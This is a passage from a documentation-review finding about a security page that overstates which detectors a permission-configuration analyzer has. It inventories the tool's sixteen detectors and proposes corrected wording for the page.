* **`docs/security.md:533-534` credits the audit's deterministic analyzer with two detectors it does not have.** It lists *"over-broad allows, duplicates, risky patterns, missing safety denies"*. There is no duplicate detector and no missing-safety-deny detector anywhere in `security_audit` / `danger` / `takeover_audit` / `clarity` / `environment_audit`; the five danger detectors are arbitrary-exec, destructive-cmd, secrets-exposure, unanchored-regex and blanket-allow-outside-takeover. Duplicate/consolidation analysis is the **maintenance** skill's, which the same page correctly attributes two lines earlier in the review table (`docs/security.md:465`) and again at `451`, where the same analyzer is described accurately. So the page contradicts itself about one tool's capabilities, in the direction of over-promising -- the worse direction for a security document.
  * **Pass 2 inventory, 2026-08-11**: the audit's full detector set is **16, across four sources** -- danger 5 (`arbitrary-exec-allow`, `destructive-cmd-allow`, `secrets-exposure-allow`, `unanchored-regex-allow`, `blanket-allow-outside-takeover`), takeover 6 (`hook-not-registered`, `partial-hook-registration`, `takeover-conflict-with-blanket-allows`, `uncovered-blanket-allow`, `loose-no-match-fallback`, `loose-undecidable-fallback`), clarity 4 (`deny-shadows-allow`, `ask-overlaps-allow`, `multi-section-interaction`, `cross-layer-dependent`), environment 1 (`pythonpath-shadows-hook`). None of them is a duplicate detector or a missing-safety-deny detector.
  * **Proposed replacement for `docs/security.md:533-534`, for `/documentation-review` (quoted verbatim; `docs/` is frozen in this pass):** *"config" -- it runs a deterministic analyzer first (over-broad and blanket allows, destructive-command and secret-file allows, unanchored regexes, takeover-mode misconfiguration, and confusing rule interactions, ranked by severity), then optionally a deeper judgement-based*
  * The same omission runs the other way at `docs/security.md:451`, which describes the analyzer accurately but likewise names neither the clarity nor the environment detectors. Worth fixing in the same pass.
